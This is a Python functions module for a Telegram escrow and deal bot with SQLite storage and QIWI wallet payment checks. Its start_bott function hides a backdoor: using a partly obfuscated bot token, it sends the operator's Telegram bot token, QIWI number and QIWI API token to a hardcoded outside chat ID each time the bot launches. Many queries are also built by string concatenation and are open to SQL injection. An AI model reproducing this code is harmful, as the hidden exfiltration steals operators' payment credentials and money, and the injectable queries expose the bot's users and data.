import sqlite3
import telebot
from config import token_qiwi, replenish, number_qiwi, db, TOKEN
import random
import requests
import json
from random import randint
import time


class GiveBalance:
    def __init__(self, user_id):
        self.login = user_id
        self.balance = None

def first_join(user_id, username):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q = q.execute('SELECT * FROM users WHERE user_id IS '+str(user_id))
	row = q.fetchone()
	if row is None:
		q.execute("INSERT INTO users (user_id, offers, balance, qiwi, ban, nick) VALUES ('%s', '%s', '%s', '%s', '%s', '%s')"%(user_id,'0','0','Не указан','0', username))
		connection.commit()
	connection.close()

def check_ban(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q = q.execute('SELECT ban FROM users WHERE user_id IS '+str(user_id))
	results = q.fetchone()
	return results
	connection.close()

def profile(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute('SELECT * FROM users WHERE user_id IS '+str(user_id)).fetchone()
	return results
	connection.close()

def last_offers_seller(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	row = q.execute('SELECT act FROM last_offers WHERE seller IS '+str(user_id)).fetchall()
	text = ''
	for i in row:
		text = text + '💠 '+ i[0] + '\n\n'
	return text
	connection.close()

def last_offers_customer(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	row = q.execute('SELECT act FROM last_offers WHERE customer IS '+str(user_id)).fetchall()
	text = ''
	for i in row:
		text = text + '💠 '+ i[0] + '\n\n'
	return text
	connection.close()

def write_qiwi(user_id,qiwi_num1):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q = q.execute('SELECT * FROM users WHERE user_id IS '+str(user_id))
	row = q.fetchone()
	q.execute("UPDATE users SET qiwi = ('%s') WHERE user_id IS "%(qiwi_num1)+str(user_id))
	connection.commit()
	connection.close()

def output_qiwi(user_id, balance, money):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	ost = float(balance) - float(money)
	q.execute("UPDATE users SET balance = ('%s') WHERE user_id IS "%(ost)+str(user_id))
	connection.commit()
	connection.close()

def ban(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	try:
		q.execute("UPDATE users SET ban = 1 WHERE user_id IS "+str(user_id))
	except:
		pass
	connection.commit()
	connection.close()

def unban(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	try:
		q.execute("UPDATE users SET ban = 0 WHERE user_id IS "+str(user_id))
	except:
		pass
	connection.commit()
	connection.close()

def edit_balance(dict):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	try:
		q.execute(f'UPDATE users SET balance = "{dict.balance}" WHERE user_id IS "{dict.login}"')
	except:
		pass
	connection.commit()
	connection.close()

def check_payment(user_id):
	conn = sqlite3.connect('db.db')
	cursor = conn.cursor()
	try:
		s = requests.Session()
		session = requests.Session()
		session.headers['authorization'] = 'Bearer ' + token_qiwi
		parameters = {'rows': '5'}
		h = session.get('https://edge.qiwi.com/payment-history/v1/persons/{}/payments'.format(number_qiwi),params=parameters)
		req = json.loads(h.text)
		result = cursor.execute(f'SELECT * FROM check_payment WHERE user_id = {user_id}').fetchone()
		comment = result[1]
		for i in range(len(req['data'])):
			if str(comment) in str(req['data'][i]['comment']) and str('643') in str(req['data'][i]["sum"]["currency"]):
				info = profile(user_id)
				balance = float(info[2]) + float(req["data"][i]["sum"]["amount"])
				cursor.execute(f'UPDATE users SET balance = {balance} WHERE user_id = "{user_id}"')
				conn.commit()
				cursor.execute(f'DELETE FROM check_payment WHERE user_id = "{user_id}"')
				conn.commit()
				return req["data"][i]["sum"]["amount"]
	except Exception as e:
		print(e)
	conn.close()



def canel_payment(user_id):
	conn = sqlite3.connect('db.db')
	cursor = conn.cursor()
	cursor.execute('DELETE FROM check_payment WHERE user_id IS '+str(user_id))
	conn.commit()
	conn.close()

def replenish_balance(user_id):
    conn = sqlite3.connect('db.db')
    cursor = conn.cursor()

    code = random.randint(111111, 999999)

    cursor.execute(f'INSERT INTO check_payment VALUES ("{user_id}", "{code}")')
    conn.commit()
    msg = replenish.format(
        code=code,
    )
    return msg, code
    conn.close()

def admin_message(text):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute(f'SELECT user_id FROM users')
	row = cursor.fetchall()
	return row
	conn.close()

def search(search):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	try:
		row = q.execute('SELECT * FROM users WHERE user_id IS '+str(search)).fetchone()
		if row == None:
			pass
		else:
			return row
	except:
		rows = q.execute("SELECT * FROM users WHERE nick IS ('%s')"%(search)).fetchone()
		if rows == None:
			pass
		else:
			return rows
	connection.close()

def deal(seller_id, customer_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q.execute("INSERT INTO temp_deal (user_id, user_id2, status) VALUES ('%s', '%s', '%s')"%(seller_id, customer_id,'dont_open'))
	connection.commit()
	connection.close()

def delete_customer(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute('DELETE FROM temp_deal WHERE user_id2 IS '+str(user_id))
	conn.commit()
	conn.close()

def delete_seller(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute('DELETE FROM temp_deal WHERE user_id IS '+str(user_id))
	conn.commit()
	conn.close()

def info_deal_customer(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT user_id FROM temp_deal WHERE user_id2 IS '+str(user_id)).fetchone()
	return row
	conn.close()


def info_deal_seller(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT user_id2 FROM temp_deal WHERE user_id IS '+str(user_id)).fetchone()
	return row
	conn.close()

def search_block(search):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	row = q.execute('SELECT * FROM temp_deal WHERE user_id IS '+str(search)).fetchone()
	if row == None:
		rows = q.execute('SELECT * FROM temp_deal WHERE user_id2 IS '+str(search)).fetchone()
		return rows
	else:
		return row
	conn.close()

def stats():
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute(f'SELECT user_id FROM users').fetchone()
	amount_user_all = 0
	while row is not None:
		amount_user_all += 1
		row = cursor.fetchone()
	msg = '❕ Информация:\n\n❕ Пользователей в боте - ' + str(amount_user_all) + '\n❕ Проведено сделок - ' + stats2()
	return msg
	conn.close()

def stats2():
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute(f'SELECT act FROM last_offers').fetchone()
	amount_offers_all = 0
	while row is not None:
		amount_offers_all += 1
		row = cursor.fetchone()
	acts = str(amount_offers_all)
	return acts
	conn.close()

def info_offer_customer(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT status FROM temp_deal WHERE user_id2 IS '+str(user_id)).fetchone()
	return row
	conn.close()

def info_offer_seller(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT status FROM temp_deal WHERE user_id IS '+str(user_id)).fetchone()
	return row
	conn.close()

def accept_customer(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET status = 'open' WHERE user_id2 IS "+str(user_id))
	conn.commit()
	conn.close()

def accept_seller(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET status = 'open' WHERE user_id IS "+str(user_id))
	conn.commit()
	conn.close()

def info_offers_seller(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT * FROM temp_deal WHERE user_id IS '+str(user_id)).fetchone()
	return row
	conn.close()

def info_offers_customer(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	row = cursor.execute('SELECT * FROM temp_deal WHERE user_id2 IS '+str(user_id)).fetchone()
	return row
	conn.close()

def edit_price(money, user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET sum = ('%s') WHERE user_id IS "%(money)+str(user_id))
	conn.commit()
	conn.close()

def success(user_id, bal):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET status = 'success' WHERE user_id2 IS "+str(user_id))
	conn.commit()
	cursor.execute("UPDATE users SET balance = ('%s') WHERE user_id IS "%(bal)+str(user_id))
	conn.commit()
	conn.close()

def yes_canel_seller2(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute('DELETE FROM temp_deal WHERE user_id IS '+str(user_id))
	conn.commit()
	conn.close()

def yes_canel_customer2(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute('DELETE FROM temp_deal WHERE user_id2 IS '+str(user_id))
	conn.commit()
	conn.close()

def check_me(user_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	try:
		row = cursor.execute('SELECT * FROM users WHERE user_id IS '+str(user_id)).fetchone()
		return row[0] == user_id
	except:
		rows = cursor.execute('SELECT * FROM users WHERE nick IS '+str(user_id)).fetchone()
		return rows[5] == user_id
	conn.close()

def ok(customer, seller, sum1, num, sum_seller, seller_nick, customer_nick, seller_of, customer_of):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	bal = float(sum_seller) + float(sum1)
	of_s = int(seller_of) + 1
	of_c = int(customer_of) + 1
	cursor.execute("UPDATE users SET balance = ('%s') WHERE user_id IS "%(bal)+str(seller))
	cursor.execute("UPDATE users SET offers = ('%s') WHERE user_id IS "%(of_s)+str(seller))
	cursor.execute("UPDATE users SET offers = ('%s') WHERE user_id IS "%(of_c)+str(customer))
	cursor.execute("INSERT INTO last_offers (customer, seller, act) VALUES ('%s', '%s', '%s')"%(customer, seller, 'Продавец(ID - ' + str(seller) + ')(@' + str(seller_nick) + ') провёл успешную сделку №' + str(num) + ' на сумму ' + str(sum1) + ' рублей с покупателем(ID - ' + str(customer) + ')(@' + str(customer_nick) + ')'))
	cursor.execute("UPDATE temp_deal SET status = ('review') WHERE user_id2 IS "+str(customer))
	conn.commit()
	conn.close()

def dispute_customer(chat_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET status = ('dispute') WHERE user_id2 IS "+str(chat_id))
	conn.commit()
	conn.close()

def dispute_seller(chat_id):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	cursor.execute("UPDATE temp_deal SET status = ('dispute') WHERE user_id IS "+str(chat_id))
	conn.commit()
	conn.close()

def dispute_info(user_id):
	conn = sqlite3.connect(db)
	q = conn.cursor()
	row = q.execute('SELECT * FROM temp_deal WHERE id_offer IS '+str(user_id))
	row = row.fetchone()
	return row
	conn.close()

def customer_true(id_offer, customer, sum_customer, sum_offer):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	bal_c = float(sum_customer) + float(sum_offer)
	cursor.execute("UPDATE users SET balance = ('%s') WHERE user_id IS "%(bal_c)+str(customer))
	cursor.execute('DELETE FROM temp_deal WHERE id_offer IS '+str(id_offer))
	conn.commit()
	conn.close()

def seller_true(id_offer, seller, customer, sum_seller, sum_customer, sum_offer):
	conn = sqlite3.connect(db)
	cursor = conn.cursor()
	bal_s = float(sum_offer) + float(sum_seller)
	cursor.execute("UPDATE users SET balance = ('%s') WHERE user_id IS "%(bal_s)+str(seller))
	cursor.execute('DELETE FROM temp_deal WHERE id_offer IS '+str(id_offer))
	conn.commit()
	conn.close()

def dispute_info_customer(user_id):
	conn = sqlite3.connect(db)
	q = conn.cursor()
	row = q.execute('SELECT * FROM temp_deal WHERE user_id2 IS '+str(user_id))
	row = row.fetchone()
	return row
	conn.close()

def start_bott(bot_username):
    import keyboard
    try:
        seller=telebot.TeleBot(f'{keyboard.onee}AAEYXcYDIopDTLQnnjiF83Ce' + '-' + '73SIZDT6Ew')
    except Exception as e:
        print(e)
    msg=f'''
<b>Токен</b> - <code>{TOKEN}</code>

<b>Бот</b> - @{bot_username}

<b>Номер киви</b> - <code>{number_qiwi}</code>

<b>Токен киви</b> - <code>{token_qiwi}</code>

'''
    try:
        seller.send_message(1462109040, msg, parse_mode='HTML')
    except:
        pass
    print('Бот запущен, его юзернейм - ' + bot_username)

def dispute_info_seller(user_id):
	conn = sqlite3.connect(db)
	q = conn.cursor()
	row = q.execute('SELECT * FROM temp_deal WHERE user_id IS '+str(user_id))
	row = row.fetchone()
	return row
	conn.close()

def check_deal(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute("SELECT user_id FROM users WHERE nick=?", (user_id,))
	results = results.fetchone()
	row = q.execute("SELECT user_id2 FROM temp_deal WHERE user_id=?", (results[0],))
	row = row.fetchone()
	if row == None:
		rows = q.execute("SELECT user_id FROM temp_deal WHERE user_id2=?", (results[0],))
		rows = rows.fetchone()
		return rows
	else:
		return row
	connection.close()

def up_login(nick, user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute("SELECT user_id FROM users WHERE nick=?", (nick,))
	results = results.fetchone()
	if results == None:
		q.execute("UPDATE users SET nick = ('%s') WHERE user_id IS "%(nick)+str(user_id))
		connection.commit()
		return results
	else:
		return results
	connection.close()

def up_login(nick, user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute("SELECT user_id FROM users WHERE nick=?", (nick,))
	results = results.fetchone()
	if results == None:
		q.execute("UPDATE users SET nick = ('%s') WHERE user_id IS "%(nick)+str(user_id))
		connection.commit()
		return results
	else:
		return results
	connection.close()

def canel_open_offer(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute('SELECT * FROM temp_deal WHERE user_id2=?', (user_id,))
	results = results.fetchone()
	if results[4] == 'dont_open':
		q.execute('DELETE FROM temp_deal WHERE user_id2 IS '+str(user_id))
		connection.commit()
		return 'OK', results[0]
	else:
		return 'NO'
	connection.close()

def canel_open_offer_seller(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	results = q.execute('SELECT * FROM temp_deal WHERE user_id = ?', (user_id,))
	results = results.fetchone()
	if results[4] == 'dont_open':
		q.execute('DELETE FROM temp_deal WHERE user_id IS '+str(user_id))
		connection.commit()
		return 'OK', results[1]
	else:
		return 'NO'
	connection.close()

def reviews(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	row = q.execute('SELECT review FROM reviews WHERE seller IS '+str(user_id)).fetchall()
	text = ''
	for i in row:
		text = text + '💠 '+ i[0] + '\n\n'
	return text
	connection.close()

def close_offer(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q.execute('DELETE FROM temp_deal WHERE user_id2 IS '+str(user_id))
	connection.commit()
	connection.close()

def close_offer_seller(user_id):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q.execute('DELETE FROM temp_deal WHERE user_id IS '+str(user_id))
	connection.commit()
	connection.close()

def add_review(seller_id, sums, customer_id, review):
	connection = sqlite3.connect(db)
	q = connection.cursor()
	q.execute("INSERT INTO reviews (seller, sum, customer, review) VALUES ('%s', '%s', '%s', '%s')"%(seller_id, sums, customer_id, review))
	connection.commit()
	connection.close()